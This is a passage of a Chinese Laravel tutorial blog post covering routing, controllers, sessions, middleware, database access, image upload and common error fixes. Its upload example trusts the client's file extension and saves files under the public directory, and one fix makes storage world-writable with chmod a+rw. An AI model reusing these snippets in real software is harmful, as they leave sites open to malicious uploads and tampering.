class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">session1</span><span class=\"params\">(Request $request)</span> </span>&#123;</span><br><span class=\"line\">        Session::forget(<span class=\"string\">'student'</span>);</span><br><span class=\"line\">        Session::flush(<span class=\"string\">'key'</span>, <span class=\"string\">'default'</span>);\t<span class=\"comment\">// temporary</span></span><br><span class=\"line\">        Session::flush();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">session2</span><span class=\"params\">(Request $request)</span> </span>&#123;</span><br><span class=\"line\">    \t<span class=\"keyword\">echo</span> Session::has(<span class=\"string\">'student'</span>);\t\t<span class=\"comment\">// return bool</span></span><br><span class=\"line\">        $res = Session::pull(<span class=\"string\">'student'</span>, <span class=\"string\">'default'</span>);</span><br><span class=\"line\">        dd($res);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"Response\"><a href=\"#Response\" class=\"headerlink\" title=\"Response\"></a>Response</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// 响应json</span></span><br><span class=\"line\">        $data = [</span><br><span class=\"line\">          <span class=\"string\">'errCode'</span> =&gt; <span class=\"number\">0</span>,</span><br><span class=\"line\">          <span class=\"string\">'errMsg'</span> =&gt; <span class=\"string\">'success'</span>,</span><br><span class=\"line\">          <span class=\"string\">'data'</span> =&gt; <span class=\"string\">'fenlan'</span>,</span><br><span class=\"line\">        ];</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> response()-&gt;json($data);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// redirect</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> redirect(<span class=\"string\">'session2'</span>);</span><br><span class=\"line\"><span class=\"number\">9</span>&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"Middleware\"><a href=\"#Middleware\" class=\"headerlink\" title=\"Middleware\"></a>Middleware</h2><p><strong>目的：实现一个功能，当访问时间小于活动开始时间，则跳转到宣传页面，当访问时间大于活动开始时间，则跳转到活动界面</strong><br><strong>1.宣传页面和活动页面构造</strong><br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// app\\Http\\Controller\\StudentController.php</span></span><br><span class=\"line\">    <span class=\"comment\">// 宣传页面</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">activity0</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">'活动快要开始啦，敬请关注'</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 活动页面</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">activity1</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">'活动进行中，谢谢您的参与1'</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 活动页面</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">activity2</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">'活动进行中，谢谢您的参与2'</span>;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure></p>\n<p><strong>2.添加Middleware</strong><br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// app\\Http\\Middleware\\Activity.php</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">App</span>\\<span class=\"title\">Http</span>\\<span class=\"title\">Middleware</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">Closure</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Activity</span></span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">handle</span><span class=\"params\">($request, Closure $next)</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (time() &lt; strtotime(<span class=\"string\">'2017-08-03'</span>)) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">return</span> redirect(<span class=\"string\">'activity0'</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> $next($request);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// app\\Http\\Kernel.php 中添加一条Middleware</span></span><br><span class=\"line\"><span class=\"keyword\">protected</span> $routeMiddleware = [</span><br><span class=\"line\">        <span class=\"string\">'auth'</span> =&gt; \\Illuminate\\Auth\\Middleware\\Authenticate::class,</span><br><span class=\"line\">        <span class=\"string\">'auth.basic'</span> =&gt; \\Illuminate\\Auth\\Middleware\\AuthenticateWithBasicAuth::class,</span><br><span class=\"line\">        <span class=\"string\">'bindings'</span> =&gt; \\Illuminate\\Routing\\Middleware\\SubstituteBindings::class,</span><br><span class=\"line\">        <span class=\"string\">'can'</span> =&gt; \\Illuminate\\Auth\\Middleware\\Authorize::class,</span><br><span class=\"line\">        <span class=\"string\">'guest'</span> =&gt; \\App\\Http\\Middleware\\RedirectIfAuthenticated::class,</span><br><span class=\"line\">        <span class=\"string\">'throttle'</span> =&gt; \\Illuminate\\Routing\\Middleware\\ThrottleRequests::class,</span><br><span class=\"line\">        <span class=\"string\">'activity'</span> =&gt; \\App\\Http\\Middleware\\Activity::class,</span><br><span class=\"line\">    ];</span><br></pre></td></tr></table></figure>\n<p><strong>3.添加路由</strong><br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Route::group([<span class=\"string\">'middleware'</span> =&gt; [<span class=\"string\">'activity'</span>]], <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    Route::any(<span class=\"string\">'activity1'</span>, <span class=\"string\">'StudentController@activity1'</span>);</span><br><span class=\"line\">    Route::any(<span class=\"string\">'activity2'</span>, <span class=\"string\">'StudentController@activity2'</span>);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">Route::any(<span class=\"string\">'activity0'</span>, <span class=\"string\">'StudentController@activity0'</span>);</span><br></pre></td></tr></table></figure></p>\n<p><strong>4.浏览器访问activity1或者activity2</strong></p>\n<h2 id=\"File\"><a href=\"#File\" class=\"headerlink\" title=\"File\"></a>File</h2><p><strong>项目中遇到一个问题，需要数据库储存图片，网上给出一个好的方式就是将图片的路径存进数据库，laravel中实现过程如下</strong><br><strong>1.提交图片表单</strong><br><figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;form class=\"form-horizontal\" method=\"post\" enctype=\"multipart/form-data\" action=\"&#123;&#123; url('test2') &#125;&#125;\"&gt;</span><br><span class=\"line\">    &#123;&#123; csrf_field() &#125;&#125;</span><br><span class=\"line\">&lt;input type=\"file\" name=\"photo\"&gt;</span><br><span class=\"line\">&lt;div class=\"form-group\"&gt;</span><br><span class=\"line\">    &lt;div class=\"col-sm-offset-2 col-sm-10\"&gt;</span><br><span class=\"line\">        &lt;button type=\"submit\" class=\"btn btn-primary\"&gt;提交&lt;/button&gt;</span><br><span class=\"line\">    &lt;/div&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br><span class=\"line\">&lt;/form&gt;</span><br></pre></td></tr></table></figure></p>\n<p><strong>2.显示图片页面</strong><br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img height=<span class=\"string\">\"150\"</span> width=<span class=\"string\">\"150px\"</span> src=<span class=\"string\">\"&#123;&#123;url('/images/'.$image)&#125;&#125;\"</span>/&gt;</span><br></pre></td></tr></table></figure></p>\n<p><strong>3.控制器实现</strong><br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test2</span><span class=\"params\">(Request $request)</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    $img = time() . <span class=\"string\">'.'</span> . $request-&gt;photo-&gt;getClientOriginalExtension();</span><br><span class=\"line\">    $path = $request-&gt;photo-&gt;move(public_path(<span class=\"string\">'images'</span>),$img);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> view(<span class=\"string\">'student.test2'</span>, [</span><br><span class=\"line\">        <span class=\"string\">'image'</span> =&gt; $img,</span><br><span class=\"line\">    ]);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><strong>最后图片存进了laravel项目下的public/images</strong></p>\n<h2 id=\"踩坑总结\"><a href=\"#踩坑总结\" class=\"headerlink\" title=\"踩坑总结\"></a>踩坑总结</h2><ol>\n<li><code>TokenMismatchException in VerifyCsrfToken.php line 68</code><br><strong>laravel 默认开启了 csrf验证 ，post请求需要验证csrf,所以要在表单里 加个隐藏域</strong><br><strong>解决方案：</strong><br><img src=\"/images/laravel_problem_1.png\" alt=\"\"></li>\n<li><p><code>MassAssignmentException in Model.php line 232:</code><br><strong>在添加学生的时候选择<code>action</code>为空时，会出现这个错误，解释为<code>new Student</code>时复制不能批量操作，因此要在<code>Model</code>中添加</strong></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">protected</span> $fillable = [<span class=\"string\">'name'</span>, <span class=\"string\">'age'</span>, <span class=\"string\">'sex'</span>];</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>ErrorException in HasAttributes.php line 403:\nRelationship method must return an object of type Illuminate\\Database\\Eloquent\\Relations\\Relation</code><br><strong>在写<code>Student</code>模型的时候，将一个方法命名为<code>sex</code>，但<code>Student</code>又有一个属性是<code>sex</code>，两者相冲突了，因此需要将<code>sex</code>方法重新命名以解决冲突</strong></p>\n</li>\n<li><code>无法修改和删除数据</code><br><strong>这是我遇到的巨坑的一次，原因在于<code>Student Model</code>中将主码写错了，原本应该是<code>id</code>，被我写成了<code>ID</code>，然后一直被找出来，之前就有预感是<code>Student Model</code>错了，但是我检查了很多遍都没注意，吐血。。。</strong></li>\n<li><p><code>PDOException in Connector.php line 55:could not find driver</code><br><strong>就像报错说的没有找到<code>driver(驱动)</code>，所以少了什么呢，少了<code>php</code>连接<code>mysql</code>的<code>module(组件)</code>，组件名字<code>pdo_mysql</code>，安装组件后重启<code>php-fpm</code>和<code>nginx</code></strong></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install php70w-mysql</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>Laravel sessions not working on server</code><br><strong>这个问题困扰我两天吧，然后先说遇到的问题，就是在浏览器中修改数据或者添加数据等操作后，应该在页面有一个提示消息，我单独分离出来用<code>Session</code>实现，在<code>php</code>内带服务器上可以正常工作，但是在我的<code>server</code>中却无法实现。解决方法是修改文件<code>model</code></strong></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chmod -R a+rw storage/</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>ErrorException in e4e354417ec7f106982a7198b9ad5688b9936b71.php line 1:\nUndefined variable: errors</code><br><strong>这个跟中间件有关系，主要实在5.2版本中会遇到，解决方案是将<code>Kernel.php</code>中的<code>$middlewareGroups</code>的内容移到<code>$middleware</code>中</strong></p>\n</li>\n<li><code>No supported encrypter found. The cipher and / or key length are invalid.</code><br><strong>执行<code>php artisan key:generate</code>就 ok</strong></li>\n</ol>\n<h2 id=\"项目源码\"><a href=\"#项目源码\" class=\"headerlink\" title=\"项目源码\"></a>项目源码</h2><p><a href=\"https://github.com/fenlan/laravel-ubuntu\" target=\"_blank\" rel=\"external\">laravel-ubuntu</a></p>\n","excerpt":"<h2 id=\"路由\"><a href=\"#路由\" class=\"headerlink\" title=\"路由\"></a>路由</h2><p><strong>1.基本路由</strong><br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Route::get(<span class=\"string\">'basic1'</span>, <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">'Hello World'</span>;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure></p>\n<p><strong>2.路由参数</strong><br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Route::get(<span class=\"string\">'user/&#123;id&#125;'</span>, <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"params\">($id)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">'User-id-'</span> . $id;</span><br><span class=\"line\">&#125;)-&gt;where(<span class=\"string\">'id'</span>, <span class=\"string\">'[0-9]+'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">Route::get(<span class=\"string\">'user/&#123;name?&#125;'</span>, <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"params\">($name = <span class=\"string\">'fenlan'</span>)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">'User-name-'</span> . $name;</span><br><span class=\"line\">&#125;)-&gt;where(<span class=\"string\">'name'</span>, <span class=\"string\">'[A-Za-z]+'</span>);</span><br></pre></td></tr></table></figure></p>","more":"<p><strong>3.路由群组</strong><br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Route::group([<span class=\"string\">'prefix'</span> =&gt; <span class=\"string\">'member'</span>], <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    Route::get(<span class=\"string\">'user/member-center'</span>, [<span class=\"string\">'as'</span> =&gt; <span class=\"string\">'center'</span>, <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> route(<span class=\"string\">'center'</span>);</span><br><span class=\"line\">    &#125;]);</span><br><span class=\"line\">    Route::any(<span class=\"string\">'multy1'</span>, <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">'member-multy1'</span>;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure></p>\n<p><strong>4.控制器关联</strong><br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Route::get(<span class=\"string\">'member/&#123;id&#125;'</span>, <span class=\"string\">'MemberController@info'</span>);</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>get参数中第一个是url路由，第二个是控制器MemberController及控制器中函数info</p>\n</blockquote>\n<h2 id=\"控制器\"><a href=\"#控制器\" class=\"headerlink\" title=\"控制器\"></a>控制器</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">App</span>\\<span class=\"title\">Http</span>\\<span class=\"title\">Controllers</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MemberController</span> <span class=\"keyword\">extends</span> <span class=\"title\">Controller</span></span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">info</span><span class=\"params\">($id)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//return 'member-info-id-' . $id;</span></span><br><span class=\"line\">        <span class=\"comment\">//return view('welcome');</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> view(<span class=\"string\">'info'</span>, [</span><br><span class=\"line\">            <span class=\"string\">'name'</span> =&gt; <span class=\"string\">'fenlan'</span>,</span><br><span class=\"line\">            <span class=\"string\">'age'</span> =&gt; <span class=\"number\">18</span>,</span><br><span class=\"line\">            <span class=\"string\">'sex'</span> =&gt; <span class=\"string\">'male'</span></span><br><span class=\"line\">        ]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"视图\"><a href=\"#视图\" class=\"headerlink\" title=\"视图\"></a>视图</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">info blade php</span><br><span class=\"line\">&#123;&#123;$name&#125;&#125;</span><br><span class=\"line\">&#123;&#123;$age&#125;&#125;</span><br><span class=\"line\">&#123;&#123;$sex&#125;&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>laravel新建视图完成后需要模块编译(我是这么理解的)</strong><br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php artisan serve</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"连接数据库\"><a href=\"#连接数据库\" class=\"headerlink\" title=\"连接数据库\"></a>连接数据库</h2><p><strong>在.env文件中修改配置</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">APP_NAME=Laravel</span><br><span class=\"line\">APP_ENV=<span class=\"built_in\">local</span></span><br><span class=\"line\">APP_KEY=</span><br><span class=\"line\">APP_DEBUG=<span class=\"literal\">true</span></span><br><span class=\"line\">APP_LOG_LEVEL=debug</span><br><span class=\"line\">APP_URL=http://localhost</span><br><span class=\"line\"></span><br><span class=\"line\">DB_CONNECTION=mysql</span><br><span class=\"line\">DB_HOST=127.0.0.1</span><br><span class=\"line\">DB_PORT=3306</span><br><span class=\"line\">DB_DATABASE=homestead</span><br><span class=\"line\">DB_USERNAME=homestead</span><br><span class=\"line\">DB_PASSWORD=secret</span><br><span class=\"line\"></span><br><span class=\"line\">BROADCAST_DRIVER=<span class=\"built_in\">log</span></span><br><span class=\"line\">CACHE_DRIVER=file</span><br><span class=\"line\">SESSION_DRIVER=file</span><br><span class=\"line\">QUEUE_DRIVER=sync</span><br><span class=\"line\"></span><br><span class=\"line\">REDIS_HOST=127.0.0.1</span><br><span class=\"line\">REDIS_PASSWORD=null</span><br><span class=\"line\">REDIS_PORT=6379</span><br><span class=\"line\"></span><br><span class=\"line\">MAIL_DRIVER=smtp</span><br><span class=\"line\">MAIL_HOST=smtp.mailtrap.io</span><br><span class=\"line\">MAIL_PORT=2525</span><br><span class=\"line\">MAIL_USERNAME=null</span><br><span class=\"line\">MAIL_PASSWORD=null</span><br><span class=\"line\">MAIL_ENCRYPTION=null</span><br><span class=\"line\"></span><br><span class=\"line\">PUSHER_APP_ID=</span><br><span class=\"line\">PUSHER_APP_KEY=</span><br><span class=\"line\">PUSHER_APP_SECRET=</span><br></pre></td></tr></table></figure></p>\n<p><strong>修改完成后再编译一下，就连接成功</strong></p>\n<h2 id=\"数据库操作\"><a href=\"#数据库操作\" class=\"headerlink\" title=\"数据库操作\"></a>数据库操作</h2><p><strong>1.使用DB facade实现CURD</strong><br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">App</span>\\<span class=\"title\">Http</span>\\<span class=\"title\">Controllers</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">Illuminate</span>\\<span class=\"title\">Support</span>\\<span class=\"title\">Facades</span>\\<span class=\"title\">DB</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">StudentController</span> <span class=\"keyword\">extends</span> <span class=\"title\">Controller</span></span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test1</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        $student = DB::select(<span class=\"string\">'SELECT * FROM student'</span>);</span><br><span class=\"line\">        dd($student);</span><br><span class=\"line\">        <span class=\"comment\">// $bool = DB::insert('INSERT INTO student(name, ID) VALUES(?, ?)', ['fenlan', '15130110067']);</span></span><br><span class=\"line\">        <span class=\"comment\">// $num = DB::update('UPDATE student SET in_time = ? WHERE ID = ?', ['2015', '15130110067']);</span></span><br><span class=\"line\">        <span class=\"comment\">// $num = DB::delete('DELETE FROM student WHERE id &gt; ?', ['15130110067']);</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><strong>这种方法属于原始方法，接下来有更酷的操作数据库方法</strong></p>\n<p><strong>2.查询构造器及新增数据</strong><br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test2</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        $bool = DB::table(<span class=\"string\">'student'</span>)-&gt;insert([</span><br><span class=\"line\">            [<span class=\"string\">'ID'</span> =&gt; <span class=\"string\">'15130110098'</span>, <span class=\"string\">'name'</span> =&gt; <span class=\"string\">'小淳'</span>, <span class=\"string\">'sex'</span> =&gt; <span class=\"string\">'female'</span>, <span class=\"string\">'class'</span> =&gt; <span class=\"string\">'1513011'</span>,</span><br><span class=\"line\">            <span class=\"string\">'in_time'</span> =&gt; <span class=\"string\">'2015'</span>, <span class=\"string\">'status'</span> =&gt; <span class=\"string\">'stay_in'</span>]</span><br><span class=\"line\">            [<span class=\"string\">'ID'</span> =&gt; <span class=\"string\">'15130110099'</span>, <span class=\"string\">'name'</span> =&gt; <span class=\"string\">'小明'</span>, <span 